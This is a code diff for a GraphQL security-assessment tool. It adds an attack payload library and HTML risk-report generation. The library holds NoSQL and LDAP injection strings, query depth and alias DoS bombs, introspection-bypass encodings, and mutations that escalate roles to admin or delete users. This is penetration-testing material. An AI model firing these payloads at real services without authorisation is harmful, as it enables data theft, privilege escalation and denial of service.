+                '{ user(filter: "{\\"$ne\\": \\"\\"}") { id name } }',
+                '{ user(filter: "{\\"$regex\\": \\".*\\"}") { id name } }',
+                '{ user(filter: "{\\"$where\\": \\"function() { return true; }\\"}") { id name } }',
+                '{ user(filter: "{\\"$gt\\": \\"\\"}") { id name } }',
+            ],
+            "ldap": [
+                '{ user(id: "admin)(&") { id name } }',
+                '{ user(id: "admin)(|(objectClass=*))") { id name } }',
+                '{ user(id: "*)(uid=*))(|(uid=*") { id name } }',
+            ],
+        },
+        "dos_attacks": {
+            "depth_bombs": [
+                "{ " + "user { " * 10 + "id" + " }" * 10 + " }",
+                "{ " + "user { " * 20 + "id" + " }" * 20 + " }",
+                "{ " + "user { " * 50 + "id" + " }" * 50 + " }",
+            ],
+            "alias_bombs": [
+                "{ " + " ".join([f"alias{i}: __typename" for i in range(100)]) + " }",
+                "{ " + " ".join([f"alias{i}: __typename" for i in range(500)]) + " }",
+                "{ " + " ".join([f"alias{i}: __typename" for i in range(1000)]) + " }",
+            ],
+            "directive_abuse": [
+                "{ __typename " + "@include(if: true) " * 100 + " }",
+                "{ __typename " + "@skip(if: false) " * 100 + " }",
+                "{ __typename " + '@deprecated(reason: "test") ' * 100 + " }",
+            ],
+        },
+        "bypass_techniques": {
+            "field_suggestions": [
+                "{ __schema { types { name fieldsssss } } }",  # Typo to trigger suggestions
+                "{ __schema { types { name field } } }",
+                "{ user { ide } }",  # Typo for 'id'
+                "{ user { namee } }",  # Typo for 'name'
+            ],
+            "unicode": [
+                "{ \\u005f\\u005fschema { types { name } } }",  # Unicode __schema
+                "{ \\u005f\\u005ftypename }",  # Unicode __typename
+                "{ user\\u0028id: \\u00221\\u0022\\u0029 { id } }",  # Unicode function call
+            ],
+            "encoding": [
+                "{ __\\u0073chema { types { name } } }",  # Partial unicode
+                "{ _\\u005fschema { types { name } } }",  # Mixed encoding
+                '{ user(id: "\\x31") { id } }',  # Hex encoding
+            ],
+        },
+        "mutation_attacks": [
+            'mutation { createUser(input: {name: "test", email: "test@test.com"}) { id } }',
+            'mutation { updateUser(id: "1", input: {name: "admin"}) { id name } }',
+            'mutation { deleteUser(id: "1") { success } }',
+            'mutation { bulkUpdate(filter: {}, input: {role: "admin"}) { count } }',
+        ],
+        "subscription_attacks": [
+            "subscription { userUpdated { id name } }",
+            'subscription { messageAdded(channel: "*") { content } }',
+            "subscription { allChanges { __typename } }",
+        ],
+        "error_disclosure": [
+            "{ nonExistentField }",
+            "{ user(id: 999999) { id } }",
+            '{ user(invalidParam: "test") { id } }',
+            "query InvalidQuery { user { nonExistentField } }",
+        ],
+    }
+
+    # Calculate total payloads
+    total_payloads = 0
+    categories = []
+
+    for category, subcategories in payload_library.items():
+        if category != "metadata":
+            categories.append(category)
+            if isinstance(subcategories, dict):
+                for subcat, payloads in subcategories.items():
+                    if isinstance(payloads, list):
+                        total_payloads += len(payloads)
+            elif isinstance(subcategories, list):
+                total_payloads += len(subcategories)
+
+    payload_library["metadata"]["total_payloads"] = total_payloads
+    payload_library["metadata"]["categories"] = categories
+
+    return payload_library
+
+
+def save_payload_library(library, output_path):
+    """Save payload library to JSON file"""
+    try:
+        with open(output_path, "w") as f:
+            json.dump(library, f, indent=2)
+        return True
+    except Exception as e:
+        print(f"❌ [PAYLOAD-LIB] Failed to save library: {e}")
+        return False
+
+
+def load_custom_payloads(custom_file):
+    """Load custom payloads from external file"""
+    try:
+        if Path(custom_file).exists():
+            with open(custom_file, "r") as f:
+                if custom_file.endswith(".json"):
+                    return json.load(f)
+                else:
+                    # Treat as text file with one payload per line
+                    return [
+                        line.strip()
+                        for line in f
+                        if line.strip() and not line.startswith("#")
+                    ]
+        return []
+    except Exception as e:
+        print(f"⚠️  [PAYLOAD-LIB] Could not load custom payloads: {e}")
+        return []
+
+
+def generate_context_payloads(target_info, verbose=False):
+    """Generate context-aware payloads based on target analysis"""
+    context_payloads = []
+
+    # Analyze target for context clues
+    if "user" in target_info.lower():
+        context_payloads.extend(
+            [
+                "{ users { id name email role } }",
+                '{ user(id: "1") { id name email password } }',
+                "{ me { id name email permissions } }",
+            ]
+        )
+
+    if "admin" in target_info.lower():
+        context_payloads.extend(
+            [
+                "{ admin { id permissions } }",
+                "{ adminUsers { id name role } }",
+                "{ systemInfo { version database } }",
+            ]
+        )
+
+    if "product" in target_info.lower() or "shop" in target_info.lower():
+        context_payloads.extend(
+            [
+                "{ products { id name price } }",
+                "{ orders { id total items { name price } } }",
+                "{ cart { items { product { name price } } } }",
+            ]
+        )
+
+    if "message" in target_info.lower() or "chat" in target_info.lower():
+        context_payloads.extend(
+            [
+                "{ messages { id content author { name } } }",
+                "{ conversations { id participants { name } } }",
+                "{ channels { id name members { name role } } }",
+            ]
+        )
+
+    if verbose and context_payloads:
+        print(
+            f"📚 [PAYLOAD-LIB] Generated {len(context_payloads)} context-aware payloads"
+        )
+
+    return context_payloads
+
+
+# ========== Enhanced HTML Reporting ==========
+
+
+def generate_enhanced_html_report(target_url, all_results, output_path, verbose=False):
+    """Generate comprehensive HTML report with risk scoring and compliance mapping"""
+    if verbose:
+        print("📊 [HTML-REPORT] Generating enhanced HTML report...")
+
+    # Calculate overall risk score
+    risk_assessment = calculate_risk_score(all_results)
+
+    # Generate compliance mapping
+    compliance_data = generate_compliance_mapping(all_results)
+
+    html_content = f"""
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>GraphQL Security Assessment Report</title>
+    <style>
+        body {{ font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; margin: 0; padding: 20px; background-color: #f5f5f5; }}
+        .container {{ max-width: 1200px; margin: 0 auto; background: white; padding: 30px; border-radius: 10px; box-shadow: 0 4px 6px rgba(0,0,0,0.1); }}
+        .header {{ text-align: center; margin-bottom: 40px; padding: 20px; background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); color: white; border-radius: 10px; }}
+        .risk-score {{ font-size: 2.5em; font-weight: bold; margin: 10px 0; }}
+        .risk-critical {{ color: #dc3545; }}
+        .risk-high {{ color: #fd7e14; }}
+        .risk-medium {{ color: #ffc107; }}
+        .risk-low {{ color: #28a745; }}
+        .dashboard {{ display: grid; grid-template-columns: repeat(auto-fit, minmax(300px, 1fr)); gap: 20px; margin-bottom: 40px; }}
+        .card {{ background: white; padding: 20px; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,0.1); border-left: 4px solid #667eea; }}
+        .card h3 {{ margin-top: 0; color: #333; }}
+        .metric {{ font-size: 2em; font-weight: bold; color: #667eea; }}
+        .vulnerability {{ background: #fff5f5; border: 1px solid #fed7d7; border-radius: 6px; padding: 15px; margin: 10px 0; }}
+        .vuln-critical {{ border-left: 4px solid #dc3545; }}
+        .vuln-high {{ border-left: 4px solid #fd7e14; }}
+        .vuln-medium {{ border-left: 4px solid #ffc107; }}
+        .vuln-low {{ border-left: 4px solid #28a745; }}
+        .compliance-grid {{ display: grid; grid-template-columns: repeat(auto-fit, minmax(250px, 1fr)); gap: 15px; margin: 20px 0; }}
+        .compliance-item {{ padding: 15px; border-radius: 6px; text-align: center; }}
+        .compliance-pass {{ background: #d4edda; border: 1px solid #c3e6cb; color: #155724; }}
+        .compliance-fail {{ background: #f8d7da; border: 1px solid #f5c6cb; color: #721c24; }}
+        .compliance-partial {{ background: #fff3cd; border: 1px solid #ffeaa7; color: #856404; }}
+        .section {{ margin: 30px 0; }}
+        .table {{ width: 100%; border-collapse: collapse; margin: 20px 0; }}
+        .table th, .table td {{ padding: 12px; text-align: left; border-bottom: 1px solid #ddd; }}
+        .table th {{ background-color: #f8f9fa; font-weight: 600; }}
+        .recommendation {{ background: #e7f3ff; border: 1px solid #b3d9ff; border-radius: 6px; padding: 15px; margin: 10px 0; }}
+        .recommendation h4 {{ margin-top: 0; color: #0056b3; }}
+        .footer {{ text-align: center; margin-top: 40px; padding: 20px; background: #f8f9fa; border-radius: 6px; color: #666; }}
+        .progress-bar {{ width: 100%; height: 20px; background: #e9ecef; border-radius: 10px; overflow: hidden; }}
+        .progress-fill {{ height: 100%; background: linear-gradient(90deg, #28a745 0%, #ffc107 50%, #dc3545 100%); transition: width 0.3s ease; }}
+        .nav {{ background: #343a40; padding: 15px 0; margin: -30px -30px 30px -30px; border-radius: 10px 10px 0 0; }}
+        .nav ul {{ list-style: none; margin: 0; padding: 0; display: flex; justify-content: center; }}
+        .nav li {{ margin: 0 15px; }}
+        .nav a {{ color: white; text-decoration: none; padding: 8px 16px; border-radius: 4px; transition: background 0.3s; }}
+        .nav a:hover {{ background: #495057; }}
+        .chart {{ margin: 20px 0; text-align: center; }}
+    </style>
+    <script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <h1>🔒 GraphQL Security Assessment</h1>
+            <h2>{target_url}</h2>
+            <div class="risk-score risk-{risk_assessment['level'].lower()}">{risk_assessment['score']}/100</div>
+            <p>Risk Level: {risk_assessment['level']} | Generated: {datetime.utcnow().strftime('%Y-%m-%d %H:%M:%S')} UTC</p>
+        </div>
+        
+        <nav class="nav">
+            <ul>
+                <li><a href="#dashboard">Dashboard</a></li>
+                <li><a href="#vulnerabilities">Vulnerabilities</a></li>
+                <li><a href="#compliance">Compliance</a></li>
+                <li><a href="#recommendations">Recommendations</a></li>
+                <li><a href="#technical-details">Technical Details</a></li>
+            </ul>
+        </nav>
+        
+        <section id="dashboard" class="section">
+            <h2>📊 Executive Dashboard</h2>
+            <div class="dashboard">
+                <div class="card">
+                    <h3>🎯 Security Score</h3>
+                    <div class="metric">{risk_assessment['score']}/100</div>
+                    <div class="progress-bar">
+                        <div class="progress-fill" style="width: {risk_assessment['score']}%;"></div>
+                    </div>
+                </div>
+                <div class="card">
+                    <h3>🔍 Tests Performed</h3>
+                    <div class="metric">{risk_assessment['total_tests']}</div>
+                    <p>Comprehensive security analysis</p>
+                </div>
+                <div class="card">
+                    <h3>⚠️ Vulnerabilities</h3>
+                    <div class="metric risk-{risk_assessment['level'].lower()}">{risk_assessment['vulnerabilities_found']}</div>
+                    <p>Critical issues identified</p>
+                </div>
+                <div class="card">
+                    <h3>📋 Compliance</h3>
+                    <div class="metric">{compliance_data['overall_compliance']}%</div>
+                    <p>Security standards alignment</p>
+                </div>
+            </div>
+        </section>
+        
+        <section id="vulnerabilities" class="section">
+            <h2>🚨 Vulnerability Assessment</h2>
+            {generate_vulnerability_section(all_results)}
+        </section>
+        
+        <section id="compliance" class="section">
+            <h2>📋 Compliance Mapping</h2>
+            <div class="compliance-grid">
+                {generate_compliance_cards(compliance_data)}
+            </div>
+        </section>
+        
+        <section id="recommendations" class="section">
+            <h2>💡 Security Recommendations</h2>
+            {generate_recommendations_section(risk_assessment, all_results)}
+        </section>
+        
+        <section id="technical-details" class="section">
+            <h2>🔧 Technical Analysis Details</h2>
+            {generate_technical_details(all_results)}
+        </section>
+        
+        <div class="footer">
+            <p>Generated by GraphQLCLI Security Testing Suite | <strong>ReconCLI Framework</strong></p>
+            <p>Report generated on {datetime.utcnow().strftime('%Y-%m-%d at %H:%M:%S')} UTC</p>
+        </div>
+    </div>
+    
+    <script>
+        // Add interactive charts and visualizations
+        // Risk distribution chart, vulnerability timeline, etc.
+        console.log('GraphQL Security Report loaded');
+        
+        // Smooth scrolling for navigation
+        document.querySelectorAll('nav a').forEach(anchor => {{
+            anchor.addEventListener('click', function (e) {{
+                e.preventDefault();
+                document.querySelector(this.getAttribute('href')).scrollIntoView({{
+                    behavior: 'smooth'
+                }});
+            }});
+        }});
+    </script>
+</body>
+</html>
+"""
+
+    try:
+        with open(output_path, "w", encoding="utf-8") as f:
+            f.write(html_content)
+
+        if verbose:
+            print(f"📊 [HTML-REPORT] Enhanced report saved to: {output_path}")
+
+        return True
+    except Exception as e:
+        print(f"❌ [HTML-REPORT] Failed to generate report: {e}")
+        return False
+
+
+def calculate_risk_score(results):
+    """Calculate comprehensive risk score with CVSS-like methodology"""
+    risk_data = {
+        "score": 100,  # Start with perfect score, deduct for issues
+        "level": "LOW",
+        "total_tests": 0,
+        "vulnerabilities_found": 0,
+        "critical_issues": 0,
+        "high_issues": 0,
+        "medium_issues": 0,
+        "low_issues": 0,
+    }
+
+    vulnerability_weights = {
+        "introspection_enabled": -15,  # High risk
+        "dos_vulnerable": -20,  # Critical risk
+        "injection_vulnerable": -25,  # Critical risk
+        "auth_bypass": -30,  # Critical risk
+        "role_bypass": -20,  # High risk
+        "error_disclosure": -10,  # Medium risk
+    }
+
+    for engine, data in results.items():
+        if isinstance(data, dict):
+            risk_data["total_tests"] += 1
+
+            # Check for introspection
+            if data.get("introspection", False):
+                risk_data["score"] += vulnerability_weights["introspection_enabled"]
+                risk_data["vulnerabilities_found"] += 1
+                risk_data["high_issues"] += 1
+
+            # Check DoS vulnerabilities
+            if "dos-performance-testing" in engine:
+                for test_category, tests in data.items():
+                    if isinstance(tests, dict):
+                        for test_name, test_result in tests.items():
+                            if isinstance(test_result, dict) and test_result.get(
+                                "potential_dos", False
+                            ):
+                                risk_data["score"] += vulnerability_weights[
+                                    "dos_vulnerable"
+                                ]
+                                risk_data["vulnerabilities_found"] += 1
+                                risk_data["critical_issues"] += 1
+
+            # Check auth bypasses
+            if "jwt-auth-testing" in engine:
+                for test_category, tests in data.items():
+                    if isinstance(tests, dict):
+                        for test_name, test_result in tests.items():
+                            if isinstance(test_result, dict) and test_result.get(
+                                "auth_bypassed", False
+                            ):
+                                risk_data["score"] += vulnerability_weights[
+                                    "auth_bypass"
+                                ]
+                                risk_data["vulnerabilities_found"] += 1
+                                risk_data["critical_issues"] += 1
+
+            # Check for errors
+            if data.get("error"):
+                risk_data["score"] += vulnerability_weights["error_disclosure"]
+                risk_data["vulnerabilities_found"] += 1
+                risk_data["medium_issues"] += 1
+
+    # Ensure score doesn't go below 0
+    risk_data["score"] = max(0, risk_data["score"])
+
+    # Determine risk level
+    if risk_data["score"] >= 80:
+        risk_data["level"] = "LOW"
+    elif risk_data["score"] >= 60:
+        risk_data["level"] = "MEDIUM"
+    elif risk_data["score"] >= 40:
+        risk_data["level"] = "HIGH"
+    else:
+        risk_data["level"] = "CRITICAL"
+
+    return risk_data
+
+
+def generate_compliance_mapping(results):
+    """Generate compliance mapping for security standards"""
+    compliance_standards = {
+        "OWASP_Top_10": {
+            "A01_Broken_Access_Control": False,
+            "A03_Injection": False,
+            "A04_Insecure_Design": False,
+            "A05_Security_Misconfiguration": False,
+            "A06_Vulnerable_Components": False,
+        },
+        "NIST_CSF": {
+            "Identify": True,
+            "Protect": False,
+            "Detect": True,
+            "Respond": False,
+            "Recover": False,
+        },
+        "ISO_27001": {
+            "Access_Control": False,
+            "Cryptography": False,
+            "Security_Architecture": False,
+            "Vulnerability_Management": True,
+        },
+    }
+
+    # Analyze results for compliance
+    for engine, data in results.items():
+        if isinstance(data, dict):
+            # Check for injection vulnerabilities
+            if any(
+                keyword in str(data).lower()
+                for keyword in ["injection", "sql", "nosql"]
+            ):
+                compliance_standards["OWASP_Top_10"]["A03_Injection"] = True
+
+            # Check for access control issues
+            if any(
+                keyword in str(data).lower() for keyword in ["auth", "bypass", "role"]
+            ):
+                compliance_standards["OWASP_Top_10"]["A01_Broken_Access_Control"] = True
+
+            # Check for misconfigurations
+            if data.get("introspection", False):
+                compliance_standards["OWASP_Top_10"][
+                    "A05_Security_Misconfiguration"
+                ] = True
+
+    # Calculate overall compliance percentage
+    total_checks = sum(
+        len(standard.values()) for standard in compliance_standards.values()
+    )
+    passed_checks = sum(
+        sum(standard.values()) for standard in compliance_standards.values()
+    )
+    overall_compliance = (
+        round((passed_checks / total_checks) * 100) if total_checks > 0 else 0
+    )
+
+    return {
+        "standards": compliance_standards,
+        "overall_compliance": overall_compliance,
+        "total_checks": total_checks,
+        "passed_checks": passed_checks,
+    }
+
+
+def generate_vulnerability_section(results):
+    """Generate HTML for vulnerability section"""
+    vulnerabilities_html = ""
+
+    for engine, data in results.items():
+        if isinstance(data, dict) and any(
+            key in engine for key in ["jwt-auth", "dos-performance", "param-fuzz"]
+        ):
+            vulnerabilities_html += f"""
+            <div class="vulnerability vuln-high">
+                <h4>🔍 {engine.replace('-', ' ').title()}</h4>
+                <p><strong>Engine:</strong> {engine}</p>
+                <p><strong>Status:</strong> Analysis Complete</p>
+                <p><strong>Findings:</strong> {len(data)} test categories executed</p>
+            </div>
+            """
+
+    if not vulnerabilities_html:
+        vulnerabilities_html = (
+            "<p>✅ No critical vulnerabilities detected in this assessment.</p>"
+        )
+
+    return vulnerabilities_html
+
+
+def generate_compliance_cards(compliance_data):
+    """Generate HTML for compliance cards"""
+    cards_html = ""
+
+    for standard_name, checks in compliance_data["standards"].items():
+        passed = sum(checks.values())
+        total = len(checks)
+        percentage = round((passed / total) * 100) if total > 0 else 0
+
+        status_class = (
+            "compliance-pass"
+            if percentage >= 80
+            else "compliance-fail" if percentage < 50 else "compliance-partial"
+        )
+
+        cards_html += f"""
+        <div class="compliance-item {status_class}">
+            <h4>{standard_name.replace('_', ' ')}</h4>
+            <div class="metric">{percentage}%</div>
+            <p>{passed}/{total} checks passed</p>
+        </div>
+        """
+
+    return cards_html
+
+
+def generate_recommendations_section(risk_assessment, results):
+    """Generate security recommendations based on findings"""
+    recommendations = []
+
+    if risk_assessment["score"] < 60:
+        recommendations.append(
+            {
+                "priority": "CRITICAL",
+                "title": "Immediate Security Hardening Required",
+                "description": "Multiple critical vulnerabilities detected. Implement comprehensive security controls immediately.",
+                "actions": [
+                    "Disable GraphQL introspection in production",
+                    "Implement query depth limiting",
+                    "Add authentication and authorization checks",
+                    "Enable comprehensive logging and monitoring",
+                ],
+            }
+        )
+
+    recommendations.append(
+        {
+            "priority": "HIGH",
+            "title": "Implement GraphQL Security Best Practices",
+            "description": "Follow industry standard security practices for GraphQL endpoints.",
+            "actions": [
+                "Use query whitelisting for critical applications",
+                "Implement rate limiting and complexity analysis",
+                "Add input validation and sanitization",
+                "Regular security assessments and penetration testing",
+            ],
+        }
+    )
+
+    recommendations_html = ""
+    for rec in recommendations:
+        actions_html = "".join([f"<li>{action}</li>" for action in rec["actions"]])
+
+        recommendations_html += f"""
+        <div class="recommendation">
+            <h4>🚨 {rec['priority']} - {rec['title']}</h4>
+            <p>{rec['description']}</p>
+            <ul>{actions_html}</ul>
+        </div>
+        """
+
+    return recommendations_html
+
+
+def generate_technical_details(results):
+    """Generate technical details section"""
+    details_html = "<table class='table'><thead><tr><th>Engine</th><th>Tests</th><th>Status</th><th>Key Findings</th></tr></thead><tbody>"
+
+    for engine, data in results.items():
+        if isinstance(data, dict):
+            status = "✅ Complete" if not data.get("error") else "❌ Error"
+            test_count = len(data) if isinstance(data, dict) else 1
+            findings = data.get("error", "Analysis completed successfully")[:100]
+
+            details_html += f"""
+            <tr>
+                <td>{engine}</td>
+                <td>{test_count}</td>
+                <td>{status}</td>
+                <td>{findings}</td>
+            </tr>
+            """
+
+    details_html += "</tbody></table>"
+    return details_html
+
+
 # ========== GraphQL Parameter Fuzzing ==========
 
 
@@ -2758,13 +4199,13 @@ def run_native_param_fuzz(
                         # GET parameter fuzzing
                         test_url_with_param = f"{test_url}?{param}={payload}"
                         response = session.get(
-                            test_url_with_param, timeout=timeout, verify=False
+                            test_url_with_param, timeout=timeout, verify=ssl_verify
                         )
                     elif method.upper() == "POST":
                         # POST form fuzzing
                         data = {param: payload}
                         response = session.post(
-                            test_url, data=data, timeout=timeout, verify=False
+                            test_url, data=data, timeout=timeout, verify=ssl_verify
                         )
                     else:
                         continue
@@ -3034,14 +4475,14 @@ def run_ffuf_param_fuzz(
                 # Cleanup temp files
                 try:
                     Path(output_file).unlink(missing_ok=True)
-                except:
-                    pass
+                except OSError as e:
+                    click.echo(f"[!] Warning: Could not delete temp file {output_file}: {e}")
 
         # Cleanup payload file
         try:
             Path(payloads_file).unlink(missing_ok=True)
-        except:
-            pass
+        except OSError as e:
+            click.echo(f"[!] Warning: Could not delete payload file {payloads_file}: {e}")
 
     except Exception as e:
         results["errors"].append(f"FFUF fuzzer setup error: {str(e)}")
